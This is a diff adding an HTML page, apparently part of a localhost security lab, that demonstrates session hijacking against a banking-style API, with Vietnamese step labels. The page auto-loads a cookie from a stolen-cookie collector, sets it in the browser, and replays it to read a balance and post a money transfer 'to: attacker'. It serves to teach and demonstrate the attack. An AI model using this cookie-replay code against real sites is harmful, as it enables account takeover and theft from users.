@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Session Hijacking Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .container {
+            background-color: #f5f5f5;
+            padding: 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        .result {
+            background-color: white;
+            padding: 15px;
+            border-radius: 3px;
+            margin: 10px 0;
+            border-left: 4px solid #4CAF50;
+        }
+        .error {
+            border-left-color: #f44336;
+        }
+        input, button {
+            margin: 5px;
+            padding: 8px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .cookie-input {
+            width: 100%;
+            height: 60px;
+            font-family: monospace;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Session Hijacking Test</h1>
+    
+    <div class="container">
+        <h2>Bước 1: Nhập Cookie đã đánh cắp</h2>
+        <p>Copy cookie từ file stolen-cookies.txt và paste vào đây:</p>
+        <textarea id="cookieInput" class="cookie-input" placeholder="connect.sid=s:..."></textarea>
+        <button onclick="setCookie()">Set Cookie</button>
+    </div>
+
+    <div class="container">
+        <h2>Bước 2: Test Session</h2>
+        <button onclick="testSession()">Test Session</button>
+        <button onclick="getBalance()">Get Balance</button>
+        <button onclick="transferMoney()">Transfer Money (Hijack)</button>
+        <div id="result"></div>
+    </div>
+
+    <script>
+        const API_URL = 'http://localhost:3000/api';
+
+        function setCookie() {
+            const cookieValue = document.getElementById('cookieInput').value.trim();
+            if (!cookieValue) {
+                alert('Vui lòng nhập cookie!');
+                return;
+            }
+            
+            // Set cookie cho domain localhost
+            document.cookie = cookieValue + '; path=/; domain=localhost';
+            console.log('Cookie set:', cookieValue);
+            alert('Cookie đã được set!');
+        }
+
+        async function testSession() {
+            try {
+                const response = await fetch(`${API_URL}/test-session`, {
+                    method: 'GET',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });
+                
+                const data = await response.json();
+                displayResult('Test Session', data);
+            } catch (error) {
+                displayResult('Test Session', { error: error.message }, true);
+            }
+        }
+
+        async function getBalance() {
+            try {
+                const response = await fetch(`${API_URL}/balance`, {
+                    method: 'GET',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });
+                
+                const data = await response.json();
+                displayResult('Get Balance', data);
+            } catch (error) {
+                displayResult('Get Balance', { error: error.message }, true);
+            }
+        }
+
+        async function transferMoney() {
+            try {
+                const response = await fetch(`${API_URL}/transfer-hijack`, {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        amount: 100,
+                        to: 'attacker'
+                    })
+                });
+                
+                const data = await response.json();
+                displayResult('Transfer Money (Hijack)', data);
+            } catch (error) {
+                displayResult('Transfer Money (Hijack)', { error: error.message }, true);
+            }
+        }
+
+        function displayResult(title, data, isError = false) {
+            const resultDiv = document.getElementById('result');
+            const resultElement = document.createElement('div');
+            resultElement.className = `result ${isError ? 'error' : ''}`;
+            resultElement.innerHTML = `
+                <h3>${title}</h3>
+                <pre>${JSON.stringify(data, null, 2)}</pre>
+            `;
+            resultDiv.appendChild(resultElement);
+        }
+
+        // Auto-load latest cookie from stolen-cookies.txt
+        window.onload = async function() {
+            try {
+                const response = await fetch('http://localhost:3001/get-latest-cookie');
+                const data = await response.json();
+                if (data.cookie) {
+                    document.getElementById('cookieInput').value = data.cookie;
+                }
+            } catch (error) {
+                console.log('Không thể load cookie tự động:', error);
+            }
+        };
+    </script>
+</body>
+</html> 
